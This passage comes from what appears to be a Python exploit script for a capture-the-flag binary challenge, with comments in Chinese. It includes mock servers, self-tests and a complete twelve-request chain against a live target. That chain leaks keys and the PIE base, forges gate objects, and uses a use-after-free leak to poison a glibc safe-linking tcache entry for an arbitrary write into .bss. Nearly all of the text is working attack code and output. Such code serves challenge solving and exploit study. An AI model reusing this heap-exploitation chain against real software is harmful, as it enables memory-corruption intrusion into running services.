        self.wr(0xC8, self.k['K1'])
        self.wr(0xC0, self.k['K2'])
        for i, f in enumerate(('a0', 'a8', 'b0', 'b8')):
            self.wr(0xA0 + 8 * i, self.k[f])
        self.wr(0x80, self.k['alt0'])
        self.wr(0x88, self.k['alt1'])
        self.cnt = 0            # = DAT_00105074
        self.plan_done = 0
        self.done34 = 0

    def hk(self):
        return {'a0': self.k['a0'], 'a8': self.k['a8'], 'b0': self.k['b0'], 'b8': self.k['b8']}

    def handle(self, raw, layer=L6):
        op, sub, aux, seq, body = self.parse(raw, layer)
        blen = len(body)
        if op == 0x7F and blen == 0:
            hk = self.hk()
            h_s = H10(0x35454c4341524f53, self.k['K1'], self.k['K2'], self.k['k78'], 0, hk)
            h_c = H10(0x35454c4341524f63, self.k['K2'], self.k['K1'], self.k['k78'], 0, hk)
            return self.reply(layer, 0x70, sub, aux, seq, struct.pack(
                '<4Q', self.k['k78'], h_s ^ (self.pie + 0x2740),
                h_c ^ (self.pie + CC_GATE_OFF), CC_PLAN_MAGIC))
        if op == 0x10 and blen == 0:
            if sub != ((self.cnt - 4) & 0xFF) or ((sub ^ 0x80) - 0x80) >= 4:
                return self.reply(layer, 0xE1, sub, aux, seq)
            si = (sub ^ 0x80) - 0x80
            outp = []
            for idx in range(4):
                m = mix2(((self.cnt & 0xFF) << 32) | idx)
                t = ((m >> 31) ^ self.rd(self.CALLOC + 8 * (si * 4 + idx + 0x10))
                     ^ self.k['k78'] ^ m) & M
                outp.append(rol(t, (self.cnt * 11 + 5 + idx) & 0x3F))
            self.cnt += 1
            return self.reply(layer, 0x80, sub, aux, seq, struct.pack('<4Q', *outp))
        if op == 0x20 and blen == 0x400:
            if self.cnt != 4 or self.plan_done:
                return self.reply(layer, 0xE1, sub, aux, seq)
            plan = bytearray()
            for i in range(0, 0x400, 2):
                cnt, ch = body[i], body[i + 1]
                if not cnt or len(plan) + cnt > 0x200:
                    return self.reply(layer, 0xE1, sub, aux, seq)
                plan += bytes((ch,)) * cnt
            if len(plan) != 0x200:
                return self.reply(layer, 0xE1, sub, aux, seq)
            self.poke(CC_PLAN_OFF, bytes(plan))
            ok = self._plan_gate()
            self.plan_done = 1 if ok else 0
            return self.reply(layer, 0x90 if ok else 0x51, sub, aux, seq)
        if op == 0x40 and blen == 0:
            if not self.plan_done or self.done34 != 2:
                return self.reply(layer, 0xE1, sub, aux, seq)
            if self._gate():
                return self.reply(layer, 0xC0, sub, aux, seq, self.FAKE_FLAG)
            return self.reply(layer, 0xE1, sub, aux, seq)
        return self.reply(layer, 0xE1, sub, aux, seq)

    def _plan_gate(self):                     # FUN_00102740 @0x2740
        hk = self.hk()
        for i in range(0x20):
            want = H10((i ^ CC_PLAN_MAGIC) & M, self.k['K1'], self.k['K2'],
                       (self.k['alt0'], self.k['alt1'])[i & 1], i, hk)
            if self.rd(CC_PLAN_OFF + 8 * i) != want:
                return False
        PM = CC_PMT_OFF
        if self.rd(PM) != CC_PMT_MAGIC: return False
        if self.rd(PM + 0x08) != self.k['K1']: return False
        if self.rd(PM + 0x10) != self.k['K2']: return False
        if self.rd(PM + 0x18) != self.pie + PM: return False
        if self.rd(PM + 0x20) != self.pie + CC_GATE_OFF: return False
        if self.rd(PM + 0x28) != self.pie + 0x2740: return False
        u = (self.k['K1'] ^ self.k['K2'] ^ CC_PLAN_MAGIC) & M
        b = 3
        for i in range(0x20):
            u = hh((rol(self.rd(CC_PLAN_OFF + 8 * i), b & 0x3F) ^ i ^ u) & M)
            b += 7
        if self.rd(PM + 0x30) != u: return False
        h0 = H10(0x35544d5250434e53, self.k['K1'], self.k['K2'], self.pie + PM,
                 self.pie + CC_GATE_OFF, hk)
        if self.rd(PM + 0x38) != h0: return False
        h1 = H10(0x35544d5250434e63, self.pie + 0x2740, u, self.k['alt0'], self.k['alt1'], hk)
        if self.rd(PM + 0x40) != h1: return False
        h2 = H10(0x35544d5250434e73, h0, h1, self.pie + PM, self.k['k78'], hk)
        if self.rd(PM + 0x48) != h2: return False
        h3 = H10(0x35544d5250434e03, h1, h2, self.pie + CC_GATE_OFF, self.k['K2'], hk)
        if self.rd(PM + 0x50) != h3: return False
        if self.rd(PM + 0x58) != (u ^ h0 ^ rol(h1, 9) ^ rol(h2, 0x1B) ^ ror(h3, 0x13)):
            return False
        return self.rd(PM + 0x60) == 1

    def _gate(self):                          # op 0x40 门 @0x1d06..0x1f34
        G = CC_GATE_OFF
        hk = self.hk()
        if self.rd(G) != CC_GATE_MAGIC: return False
        if self.rd(G + 0x08) != self.k['K1']: return False
        if self.rd(G + 0x10) != self.k['K2']: return False
        if self.rd(G + 0x18) != self.pie + CC_PMT_OFF: return False
        if self.rd(G + 0x20) != self.rd(CC_PMT_OFF + 0x58): return False
        if self.rd(G + 0x58) != 1: return False
        f8 = self.rd(G + 0x28)
        if (self.k['b0'] ^ self.rd(G + 0x10) ^ (self.pie + G) ^ ror(f8 - self.k['a0'], 23)) \
                != self.pie + CC_ORACLE_OFF:
            return False
        h0 = H10(0x3545544147434e53, self.k['K1'], self.k['K2'], self.pie + CC_PMT_OFF,
                 self.rd(CC_PMT_OFF + 0x58), hk)
        if self.rd(G + 0x30) != h0: return False
        h1 = H10(0x3545544147434e63, f8, self.pie + G, self.k['alt0'], self.k['alt1'], hk)
        if self.rd(G + 0x38) != h1: return False
        h2 = H10(0x3545544147434e73, h0, h1, self.rd(CC_PMT_OFF + 0x48),
                 self.rd(CC_PMT_OFF + 0x50), hk)
        if self.rd(G + 0x40) != h2: return False
        h3 = H10(0x3545544147434e03, h1, h2, self.k['k78'], self.k['K2'], hk)
        if self.rd(G + 0x48) != h3: return False
        want = self.rd(CC_PMT_OFF + 0x58) ^ h0 ^ rol(f8, 15) ^ ror(h2, 31) ^ ror(h3, 13)
        return self.rd(G + 0x50) == (want & M)


# ══════════════════════════════════ 自测 ══════════════════════════════════
class _Pipe:
    """把帧直接喂给 mock（同一份字节，省 socket）。"""

    def __init__(self, server):
        self.s, self.out = server, b''

    def sendall(self, b):
        self.out = self.s.handle(b)

    def recv(self, n):
        r, self.out = self.out[:n], self.out[n:]
        return r


def selftest():
    rnd = random.Random(0xC0FFEE)
    for _ in range(300):
        x = rnd.getrandbits(64)
        assert inv_hh(hh(x)) == x
    print('[1/6] hh 双射（300 例）                                        ok')

    srv = LGServer(seed=11)
    conn = Conn(L5, _Pipe(srv))
    sk = lg_leak_keys(conn)
    for f in ('c0', 'c8', 'd0', 'd8', 'e0', 'e8', 'f0', 'f8',
              's200', 's208', 's210', 's218', 's220'):
        assert sk[f] == srv.k[f], f'L5 {f}'
    assert sk['pie'] == srv.pie, f"L5 PIE {sk['pie']:#x} != {srv.pie:#x}"
    print('[2/6] L5 op 0x7f + 4x op 0x10(负下标) -> 13 字段 + PIE 全对   ok  (5 请求)')

    r = conn.xact(0x11, lg_unlock_body(sk))
    assert r.op == 0x81, f'L5 unlock -> {r.op:#x}'
    print('[3/6] L5 op 0x11 解锁门通过（s220 由 LRANSCR5 反出）            ok')

    srv6 = CCServer(seed=22)
    conn6 = Conn(L6, _Pipe(srv6))
    k = cc_leak_keys(conn6)
    for f in ('k78', 'K1', 'K2', 'a0', 'a8', 'b0', 'b8', 'alt0', 'alt1'):
        assert k[f] == srv6.k[f], f'L6 {f}'
    assert k['pie_a'] == srv6.pie and k['pie_b'] == srv6.pie, \
        f"L6 PIE {k['pie_a']:#x}/{k['pie_b']:#x} != {srv6.pie:#x}"
    assert srv6.cnt == 4
    print('[4/6] L6 op 0x7f + 4x op 0x10(sub=0xfc..0xff) -> 9 key + PIE 全对  ok  (5 请求)')

    pie = k['pie_a']
    hk = {'a0': k['a0'], 'a8': k['a8'], 'b0': k['b0'], 'b8': k['b8']}
    body20, pmt = cc_plan_body(k, hk, pie)
    r = conn6.xact(0x20, body20)
    assert r.op == 0x90, f'L6 op 0x20 -> {r.op:#x}'
    print('[5/6] L6 op 0x20 plan 门通过（32 qword 链 + permit 自指/函数指针）  ok')

    srv6.done34 = 2                         # = op 0x34 做过
    gate, f8 = cc_gate_object(k, hk, pie, pmt)
    srv6.poke(CC_GATE_OFF, gate)            # ★ 顶替缺失的 .bss 任意写
    r = conn6.xact(0x40)
    assert r.op == 0xC0, f'L6 op 0x40 -> {r.op:#x}'
    assert r.payload == CCServer.FAKE_FLAG, r.payload
    print('[6/6] L6 op 0x40 门通过 -> oracle 回包 = 假 flag                ok')
    print(f'      gate+0x28 = {f8:#018x}  = rol(&oracle ^ b0 ^ K2 ^ &gate,23) + a0')
    print('\nOK 6/6。注意：这一步的 gate 对象是用 mock.poke() 顶替写进去的；')
    print('      真正「不用 poke」的端到端跑法见 --selftest-full（L6）与 --selftest-l5w（L5）。')
    return 0


def dump_cgate():
    srv = CCServer(seed=33)
    pie, k = srv.pie, dict(srv.k)
    hk = {'a0': k['a0'], 'a8': k['a8'], 'b0': k['b0'], 'b8': k['b8']}
    k['_chain'] = cc_plan_chain(k, hk)
    pmt = cc_permit_object(k, hk, pie)
    gate, f8 = cc_gate_object(k, hk, pie, pmt)
    oracle = pie + CC_ORACLE_OFF
    print(f'PIE           = {pie:#018x}')
    print(f'&oracle       = {oracle:#018x}    (= FUN_00102c90)')
    print(f'a0 (0x50a0)   = {k["a0"]:#018x}')
    print(f'K2 (0x50e0)   = {k["K2"]:#018x}')
    print(f'b0 (0x50b0)   = {k["b0"]:#018x}')
    print(f'gate+0x28 f8  = {f8:#018x}')
    lhs = (k['b0'] ^ k['K2'] ^ (pie + CC_GATE_OFF) ^ ror(f8 - k['a0'], 23)) & M
    print(f'b0^K2^&gate^ror(f8-a0,23) = {lhs:#018x}   ==  &oracle ? {lhs == oracle}')
    assert lhs == oracle
    print(f'gate+0x50     = {struct.unpack_from("<Q", gate, 0x50)[0]:#018x}   '
          f'(= b8 ^ h0 ^ rol(f8,15) ^ ror(h2,31) ^ ror(h3,13))')
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument('--selftest', action='store_true')
    ap.add_argument('--selftest-full', action='store_true')
    ap.add_argument('--selftest-l5w', action='store_true')
    ap.add_argument('--dump-cgate', action='store_true')
    ap.add_argument('--target')
    ap.add_argument('--layer', choices=('l5', 'l6'), default='l6')
    ap.add_argument('--handshake')
    a = ap.parse_args(argv)
    if a.selftest_l5w:
        return selftest_l5_write()
    if a.selftest_full:
        return selftest_full()
    if a.dump_cgate:
        return dump_cgate()
    if a.selftest or not a.target:
        return selftest()
    host, port = a.target.rsplit(':', 1)
    s = socket.create_connection((host, int(port)), timeout=10)
    layer, hs = (L5, b'RL5/VAULT/LEDGER') if a.layer == 'l5' else (L6, b'RC5/LEDGER/COUNC')
    s.sendall(a.handshake.encode() if a.handshake else hs)
    conn = Conn(layer, s)
    if a.layer == 'l5':
        sk = lg_leak_keys(conn)
        print('L5 keys:', {x: hex(y) for x, y in sk.items() if x != '_pairs'})
        print('L5 unlock ->', conn.xact(0x11, lg_unlock_body(sk)))
    else:
        k = cc_leak_keys(conn)
        print('L6 keys:', {x: hex(y) for x, y in k.items() if x != '_pairs'})
        hk = {'a0': k['a0'], 'a8': k['a8'], 'b0': k['b0'], 'b8': k['b8']}
        body, pmt = cc_plan_body(k, hk, k['pie_a'])
        print('L6 op 0x20 ->', conn.xact(0x20, body))
        print('plan+permit 已就绪；仍缺 .bss 任意写（gate 对象写不进去）')
    return 0




# ══════════════════════════════════ L6 全链（真堆模型，不用 poke） ══════════════════════════════════
# glibc 2.35 ⇒ safe-linking 开启：
#   free 时  chunk->fd = (chunk>>12) ^ 前一个 head，chunk->key = tcache_perthread_struct
#   所以 op 0x33 让写的那个 "固定值" `(chunk>>12) ^ (pie+0x50d0)` **就是**把 tcache 的 next
#   编码成 .bss 的 gate 地址 —— 它不是门槛，它就是投毒原语。
# 而 chunk 本身可以从 op 0x32 的 UAF 泄漏里反出来：
#   obj[0x10] = ptr ^ hh(K1 ^ idx ^ "CBALLOT5")   ⇒  ptr = obj[0x10] ^ hh(...)
MAGIC_BALLOT_C = 0x35544f4c4c414243      # "CBALLOT5"
MAGIC_BALLOT_S = 0x35544f4c4c414253      # "SBALLOT5"
MAGIC_BALLOT_c = 0x35544f4c4c414263      # "cBALLOT5"
MAGIC_BALLOT_s = 0x35544f4c4c414273      # "sBALLOT5"
CC_OBJ_SIZE = 0x178


def cc_ballot_fields(k, hk, pie, idx, ptr):
    """op 0x30 造的两个对象（calloc(0x178)）的字段。"""
    u19 = hh((k['K1'] ^ idx ^ MAGIC_BALLOT_C) & M) ^ ptr
    u27 = H10(MAGIC_BALLOT_S, k['K1'], k['K2'], idx, k['k78'], hk)
    u8 = H10(MAGIC_BALLOT_c, u19, u27 ^ (pie + CC_GATE_OFF),
             (k['alt0'], k['alt1'])[idx], idx, hk)
    return u19, u27 ^ (pie + CC_GATE_OFF), u8


def cc_parse_obj_leak(payload):
    """op 0x32 的 0x28 字节：fd(已编码) / key(tcache ptr) / obj[0x10] / obj[0x18] / obj[0x20]。"""
    assert len(payload) == 0x28, f'{len(payload):#x}'
    return struct.unpack('<5Q', payload)


class CCServerHeap:
    """带 safe-linking 迷你堆的 routecouncil 镜像：全程无 poke。"""

    HEAP = 0x555555600000

    def __init__(self, pie=0x555555554000, seed=None):
        self.pie = pie
        self.bss = bytearray(0x6000)
        self.chunks = {}                     # addr -> bytearray(chunksize)
        self.csize = {}                      # addr -> 逻辑 chunk size
        self.tc = {}                         # size -> head addr（0 = 空）
        self.brk = self.HEAP + 0x1000
        self.tcache_key = self.HEAP          # tcache_perthread_struct 的"地址"
        import random as _r
        rnd = _r.Random(seed)
        R = lambda: rnd.getrandbits(64)      # noqa: E731
        self.k = dict(k78=R(), K1=R(), K2=R(), a0=R(), a8=R(), b0=R(), b8=R(),
                      alt0=R(), alt1=R())
        self.sk = cc_pairs(self.k)
        self.calloc = bytearray(0x100)       # DAT_00105460
        names = list(CC_MAGIC)
        rnd.shuffle(names)
        for i, n in enumerate(names):
            struct.pack_into('<QQ', self.calloc, 16 * i, CC_MAGIC[n], self.sk[n])
        for i in range(4):
            for j in range(4):
                struct.pack_into('<Q', self.calloc, 0x80 + 0x20 * i + 8 * j,
                                 hh(self.k['k78'] ^ j ^ i ^ 0x35454c4341524f45))
        for off, f in ((0x78, 'k78'), (0xC8, 'K1'), (0xC0, 'K2'), (0x80, 'alt0'),
                       (0x88, 'alt1')):
            struct.pack_into('<Q', self.bss, off, self.k[f])
        for i, f in enumerate(('a0', 'a8', 'b0', 'b8')):
            struct.pack_into('<Q', self.bss, 0xA0 + 8 * i, self.k[f])
        self.cnt = 0
        self.plan_done = 0
        self.objs = [0, 0]
        self.freed = 0
        self.ptr5050 = 0
        self.done34 = 0
        self.last_seq = 0

    # ---- 地址空间：.bss 用 pie+off，堆用 chunks（contiguous bump） ---- #
    def is_bss(self, a):
        return self.pie <= a < self.pie + len(self.bss)

    def _loc(self, a, n=8):
        """把绝对地址翻成 (bytearray, offset)。未映射就抛（真实进程此处 SIGSEGV）。"""
        if self.is_bss(a):
            off = a - self.pie
            assert off + n <= len(self.bss), f'.bss 越界 {a:#x}+{n:#x}'
            return self.bss, off
        for base, blob in self.chunks.items():
            if base <= a and a + n <= base + len(blob):
                return blob, a - base
        raise AssertionError(f'未映射地址 {a:#x}（真实进程这里会 SIGSEGV）')

    def rd64(self, a):
        blob, off = self._loc(a)
        return struct.unpack_from('<Q', blob, off)[0]

    def wr64(self, a, v):
        blob, off = self._loc(a)
        struct.pack_into('<Q', blob, off, v & M)

    def rd_bytes(self, a, n):
        blob, off = self._loc(a, n)
        return bytes(blob[off:off + n])

    def wr_bytes(self, a, data):
        blob, off = self._loc(a, len(data))
        blob[off:off + len(data)] = data

    # ---- safe-linking 迷你 tcache（head 指针 + 每个 entry 里编码的 next） ---- #
    @staticmethod
    def _csize(size):
        return (size + 8 + 15) & ~15

    def alloc(self, size):
        n = self._csize(size)
        h = self.tc.get(n, 0)
        if h:
            assert h % 16 == 0, f'malloc(): unaligned tcache chunk {h:#x}'
            self.tc[n] = (self.rd64(h) ^ (h >> 12)) & M     # REVEAL_PTR
            self.wr64(h + 8, 0)                            # e->key = 0
            return h
        p = self.brk
        self.brk = (p + n + 0xfff) & ~0xfff
        self.chunks[p] = bytearray(n)
        return p

    def free(self, p, size):
        n = self._csize(size)
        h = self.tc.get(n, 0)
        self.wr64(p, ((p >> 12) ^ h) & M)                  # PROTECT_PTR
        self.wr64(p + 8, self.tcache_key)
        self.tc[n] = p

    # ---- 帧 ---- #
    def reply(self, op, a, b, seq, payload=b''):
        return (struct.pack('<I', 0x10 + len(payload))
                + struct.pack('<IBBBB', L6.reply_magic, op, a, b, 0)
                + struct.pack('<II', len(payload), seq) + payload)

    def hk(self):
        return {'a0': self.k['a0'], 'a8': self.k['a8'], 'b0': self.k['b0'], 'b8': self.k['b8']}

    def handle(self, raw):
        (total,) = struct.unpack_from('<I', raw, 0)
        magic, op, sub, aux, _z = struct.unpack_from('<IBBBB', raw, 4)
        blen, seq = struct.unpack_from('<II', raw, 12)
        assert magic == L6.magic and blen == total - 0x10 and seq > self.last_seq
        self.last_seq = seq
        body = raw[20:4 + total]
        n = len(body)
        if op == 0x7F and n == 0:
            hk = self.hk()
            h_s = H10(0x35454c4341524f53, self.k['K1'], self.k['K2'], self.k['k78'], 0, hk)
            h_c = H10(0x35454c4341524f63, self.k['K2'], self.k['K1'], self.k['k78'], 0, hk)
            return self.reply(0x70, sub, aux, seq, struct.pack(
                '<4Q', self.k['k78'], h_s ^ (self.pie + 0x2740),
                h_c ^ (self.pie + CC_GATE_OFF), CC_PLAN_MAGIC))
        if op == 0x10 and n == 0:
            if sub != ((self.cnt - 4) & 0xFF) or ((sub ^ 0x80) - 0x80) >= 4:
                return self.reply(0xE1, sub, aux, seq)
            si = (sub ^ 0x80) - 0x80
            out = []
            for idx in range(4):
                m = mix2(((self.cnt & 0xFF) << 32) | idx)
                t = ((m >> 31) ^ struct.unpack_from(
                    '<Q', self.calloc, 8 * (si * 4 + idx + 0x10))[0] ^ self.k['k78'] ^ m) & M
                out.append(rol(t, (self.cnt * 11 + 5 + idx) & 0x3F))
            self.cnt += 1
            return self.reply(0x80, sub, aux, seq, struct.pack('<4Q', *out))
        # 以下都要求在 plan 门之后
        if not self.plan_done:
            if op == 0x20 and n == 0x400 and self.cnt == 4:
                plan = bytearray()
                for i in range(0, 0x400, 2):
                    c, ch = body[i], body[i + 1]
                    if not c or len(plan) + c > 0x200:
                        return self.reply(0xE1, sub, aux, seq)
                    plan += bytes((ch,)) * c
                if len(plan) != 0x200:
                    return self.reply(0xE1, sub, aux, seq)
                self.bss[CC_PLAN_OFF:CC_PLAN_OFF + 0x200] = plan
                self.plan_done = 1 if self._plan_gate() else 0
                return self.reply(0x90 if self.plan_done else 0x51, sub, aux, seq)
            return self.reply(0xE1, sub, aux, seq)
        if op == 0x30 and n == 0:                    # 造两个 0x178 对象
            if self.objs[0] or self.objs[1]:
                return self.reply(0xE1, sub, aux, seq)
            hk = self.hk()
            for i in range(2):
                p = self.alloc(CC_OBJ_SIZE)
                u19, u27, u8 = cc_ballot_fields(self.k, hk, self.pie, i, p)
                self.wr64(p + 0x10, u19)
                self.wr64(p + 0x18, u27)
                self.wr64(p + 0x20, u8)
                self.objs[i] = p
            return self.reply(0xA0, sub, aux, seq)
        if op == 0x31 and n == 0:                    # free 两个，0x5050 = 第二个
            if not self.objs[0]:
                return self.reply(0xE1, sub, aux, seq)
            self.free(self.objs[0], CC_OBJ_SIZE)
            self.free(self.objs[1], CC_OBJ_SIZE)
            self.freed, self.ptr5050 = 1, self.objs[1]
            return self.reply(0xA1, sub, aux, seq)
        if op == 0x32 and n == 0:                    # UAF 泄漏 0x28
            if not self.freed:
                return self.reply(0xE1, sub, aux, seq)
            return self.reply(0xA2, sub, aux, seq, self.rd_bytes(self.ptr5050, 0x28))
        if op == 0x33 and n == 0x10:                 # ★ 投毒：把 tcache fd 写成 gate 地址
            if not self.freed or self.done34:
                return self.reply(0xE1, sub, aux, seq)
            b0, b8 = struct.unpack_from('<QQ', body, 0)
            hk = self.hk()
            if b0 != ((self.ptr5050 >> 12) ^ (self.pie + CC_GATE_OFF)):
                return self.reply(0xE1, sub, aux, seq)
            pmt58 = struct.unpack_from('<Q', self.bss, CC_PMT_OFF + 0x58)[0]
            want = H10(MAGIC_BALLOT_s, b0, self.ptr5050, self.pie + CC_GATE_OFF, pmt58, hk)
            if b8 != want:
                return self.reply(0xE1, sub, aux, seq)
            self.wr64(self.ptr5050, b0)
            return self.reply(0xA3, sub, aux, seq)
        if op == 0x34 and n == 0x2F0:                # 2×malloc + 0x178 memcpy ⇒ 任意写
            if not self.freed or self.done34:
                return self.reply(0xE1, sub, aux, seq)
            for k2 in range(2):
                p = self.alloc(CC_OBJ_SIZE)
                self.wr_bytes(p, body[CC_OBJ_SIZE * k2:CC_OBJ_SIZE * (k2 + 1)])
            self.done34 = 2
            return self.reply(0xA4, sub, aux, seq)
        if op == 0x40 and n == 0:                    # 门 → oracle
            if self.done34 != 2 or not self.plan_done:
                return self.reply(0xE1, sub, aux, seq)
            if self._gate():
                return self.reply(0xC0, sub, aux, seq, CCServer.FAKE_FLAG)
            return self.reply(0xE1, sub, aux, seq)
        return self.reply(0xE1, sub, aux, seq)

    def _plan_gate(self):
        hk = self.hk()
        for i in range(0x20):
            want = H10((i ^ CC_PLAN_MAGIC) & M, self.k['K1'], self.k['K2'],
                       (self.k['alt0'], self.k['alt1'])[i & 1], i, hk)
            if struct.unpack_from('<Q', self.bss, CC_PLAN_OFF + 8 * i)[0] != want:
                return False
        r = lambda o: struct.unpack_from('<Q', self.bss, o)[0]   # noqa: E731
        PM = CC_PMT_OFF
        if r(PM) != CC_PMT_MAGIC or r(PM + 8) != self.k['K1'] or r(PM + 0x10) != self.k['K2']:
            return False
        if r(PM + 0x18) != self.pie + PM or r(PM + 0x20) != self.pie + CC_GATE_OFF:
            return False
        if r(PM + 0x28) != self.pie + 0x2740:
            return False
        u = (self.k['K1'] ^ self.k['K2'] ^ CC_PLAN_MAGIC) & M
        b = 3
        for i in range(0x20):
            u = hh((rol(r(CC_PLAN_OFF + 8 * i), b & 0x3F) ^ i ^ u) & M)
            b += 7
        if r(PM + 0x30) != u:
            return False
        h0 = H10(0x35544d5250434e53, self.k['K1'], self.k['K2'], self.pie + PM,
                 self.pie + CC_GATE_OFF, hk)
        h1 = H10(0x35544d5250434e63, self.pie + 0x2740, u, self.k['alt0'], self.k['alt1'], hk)
        h2 = H10(0x35544d5250434e73, h0, h1, self.pie + PM, self.k['k78'], hk)
        h3 = H10(0x35544d5250434e03, h1, h2, self.pie + CC_GATE_OFF, self.k['K2'], hk)
        if (r(PM + 0x38), r(PM + 0x40), r(PM + 0x48), r(PM + 0x50)) != (h0, h1, h2, h3):
            return False
        if r(PM + 0x58) != (u ^ h0 ^ rol(h1, 9) ^ rol(h2, 0x1B) ^ ror(h3, 0x13)):
            return False
        return r(PM + 0x60) == 1

    def _gate(self):
        G = CC_GATE_OFF
        hk = self.hk()
        r = lambda o: struct.unpack_from('<Q', self.bss, o)[0]   # noqa: E731
        if r(G) != CC_GATE_MAGIC or r(G + 8) != self.k['K1'] or r(G + 0x10) != self.k['K2']:
            return False
        if r(G + 0x18) != self.pie + CC_PMT_OFF:
            return False
        pmt58 = r(CC_PMT_OFF + 0x58)
        if r(G + 0x20) != pmt58 or r(G + 0x58) != 1:
            return False
        f8 = r(G + 0x28)
        if (self.k['b0'] ^ self.k['K2'] ^ (self.pie + G) ^ ror(f8 - self.k['a0'], 23)) \
                != self.pie + CC_ORACLE_OFF:
            return False
        h0 = H10(0x3545544147434e53, self.k['K1'], self.k['K2'], self.pie + CC_PMT_OFF,
                 pmt58, hk)
        h1 = H10(0x3545544147434e63, f8, self.pie + G, self.k['alt0'], self.k['alt1'], hk)
        h2 = H10(0x3545544147434e73, h0, h1, r(CC_PMT_OFF + 0x48), r(CC_PMT_OFF + 0x50), hk)
        h3 = H10(0x3545544147434e03, h1, h2, self.k['k78'], self.k['K2'], hk)
        if (r(G + 0x30), r(G + 0x38), r(G + 0x40), r(G + 0x48)) != (h0, h1, h2, h3):
            return False
        return r(G + 0x50) == (pmt58 ^ h0 ^ rol(f8, 15) ^ ror(h2, 31) ^ ror(h3, 13)) & M


def cc_full_chain(conn):
    """L6 从握手到读 fd 4 的完整 payload（12 个请求），不用 poke。"""
    k = cc_leak_keys(conn)                                     # 1..5
    pie = k['pie_a']
    assert k['pie_b'] == pie
    hk = {'a0': k['a0'], 'a8': k['a8'], 'b0': k['b0'], 'b8': k['b8']}
    body20, pmt = cc_plan_body(k, hk, pie)
    r = conn.xact(0x20, body20)                                # 6  plan
    assert r.op == 0x90, f'plan -> {r.op:#x}'
    r = conn.xact(0x30)                                        # 7  造对象
    assert r.op == 0xA0, f'op 0x30 -> {r.op:#x}'
    r = conn.xact(0x31)                                        # 8  free
    assert r.op == 0xA1, f'op 0x31 -> {r.op:#x}'
    r = conn.xact(0x32)                                        # 9  UAF 泄漏
    assert r.op == 0xA2, f'op 0x32 -> {r.op:#x}'
    fd_enc, tcache_ptr, obj10, obj18, obj20 = cc_parse_obj_leak(r.payload)
    chunk = obj10 ^ hh((k['K1'] ^ 1 ^ MAGIC_BALLOT_C) & M)     # ← 堆地址，白拿
    assert (chunk >> 12) ^ chunk - 0  # noqa
    poison = (chunk >> 12) ^ (pie + CC_GATE_OFF)               # safe-linking 编码
    want8 = H10(MAGIC_BALLOT_s, poison, chunk, pie + CC_GATE_OFF,
                struct.unpack_from('<Q', pmt, 0x58)[0], hk)
    r = conn.xact(0x33, struct.pack('<QQ', poison, want8))      # 10 投毒 → tcache next = &gate
    assert r.op == 0xA3, f'op 0x33 -> {r.op:#x}'
    gate, _f8 = cc_gate_object(k, hk, pie, pmt)
    body34 = bytes(CC_OBJ_SIZE) + gate + bytes(CC_OBJ_SIZE - len(gate))
    r = conn.xact(0x34, body34)                                # 11 2×malloc+memcpy ⇒ 任意写
    assert r.op == 0xA4, f'op 0x34 -> {r.op:#x}'
    r = conn.xact(0x40)                                        # 12 门 → oracle
    assert r.op == 0xC0, f'op 0x40 -> {r.op:#x}'
    return r.payload, dict(pie=pie, chunk=chunk, poison=poison)


def selftest_full():
    """L6 全链：mock 用真 safe-linking 堆模型，客户端只靠泄漏与推导，无任何 poke。"""
    srv = CCServerHeap(seed=44)
    conn = Conn(L6, _Pipe(srv))
    flag, info = cc_full_chain(conn)
    assert flag == CCServer.FAKE_FLAG, flag
    print(f'[full] L6 12 请求全链（握手除外）无 poke 通过：')
    print(f'       PIE   = {info["pie"]:#x}')
    print(f'       chunk = {info["chunk"]:#x}   (= obj[0x10] ^ hh(K1^1^"CBALLOT5"))')
    print(f'       tcache fd 写入值 = {info["poison"]:#018x}  '
          f'= (chunk>>12) ^ (PIE+0x50d0)   ← safe-linking 编码')
    print(f'       oracle 回包 = {flag!r}')
    return 0




# ══════════════════════════════════ L5 写原语（真堆模型） ══════════════════════════════════
# [asm 0x20c0..0x211f] op 0x23： body[0] == (chunk>>12) ^ (pie+0x6270)
#                              body[8] == H8(0x35464e414d474c62, body[0], chunk, pie+0x6270, s220)
#                              *chunk = body[0]              ← 写进 tcache fd
# [asm 0x2288..0x22da] op 0x33： 同型，p4 = pie+0x6070，p5 = DAT_001062c8（permit 的 xor 字段）
MAGIC_LG_MANF = 0x35464e414d474c52   # "RLGMANF5"
MAGIC_LG_GELY = 0x35594c4552474c52   # "RLGRELY5"
LG_OBJ = 0x98
LG_BIG = 0x1F8


def lg_permit_object(sk, pie):
    """`LPERMIT5` @pie+0x6270 —— **逐条按 asm 0x2bc0..0x2d8e 还原**（不是照抄 Ghidra）。"""
    hk = {'d0': sk['d0'], 'd8': sk['d8'], 'e0': sk['e0'], 'e8': sk['e8']}
    P = bytearray(0x68)

    def put(o, v):
        P[o:o + 8] = (v & M).to_bytes(8, 'little')

    c0, c8, f0, f8, s220 = sk['c0'], sk['c8'], sk['f0'], sk['f8'], sk['s220']
    put(0x00, 0x3554494d5245504c)          # "LPERMIT5"
    put(0x08, 5)
    put(0x10, c0)                          # [asm 0x2c27] == sk[0x1c0]
    put(0x18, c8)                          # [asm 0x2c37] == sk[0x1c8]
    put(0x20, pie + 0x6270)                # [asm 0x2c4e] 自指
    put(0x28, pie + 0x6070)                # [asm 0x2c5f] &relay
    put(0x30, s220)                        # [asm 0x2c70] == sk[0x220]
    # [asm 0x2c85] rdi=0x...505c rsi=c0 rdx=c8 rcx=&permit r8=&relay
    h1 = H8(0x3554494d5245505c, c0, c8, pie + 0x6270, pie + 0x6070, hk)
    put(0x38, h1)
    # [asm 0x2cbe..0x2ccf] rdi=0x...506c rsi=s220 rdx=h1 rcx=sk[0x1f0] r8=sk[0x1f8]
    h2 = H8(0x3554494d5245506c, s220, h1, f0, f8, hk)
    put(0x40, h2)
    # [asm 0x2cd4..0x2cf1] rdi=0x...507c rsi=h1 rdx=h2 rcx=&permit r8=s220
    h3 = H8(0x3554494d5245507c, h1, h2, pie + 0x6270, s220, hk)
    put(0x48, h3)
    # [asm 0x2cfa..0x2d14] rdi=0x...500c rsi=h2 rdx=h3 rcx=&relay r8=c8
    h4 = H8(0x3554494d5245500c, h2, h3, pie + 0x6070, c8, hk)
    put(0x50, h4)
    # [asm 0x2d5e..0x2d81] f8 ^ f0 ^ h1 ^ rol(h2,0xb) ^ rol(h3,0x1d) ^ ror(h4,0x11)
    put(0x58, (f8 ^ f0 ^ h1 ^ rol(h2, 0x0b) ^ rol(h3, 0x1d) ^ ror(h4, 0x11)) & M)
    put(0x60, 1)                           # [asm 0x2c79]
    return bytes(P)


def lg_relay_object(sk, pie, permit):
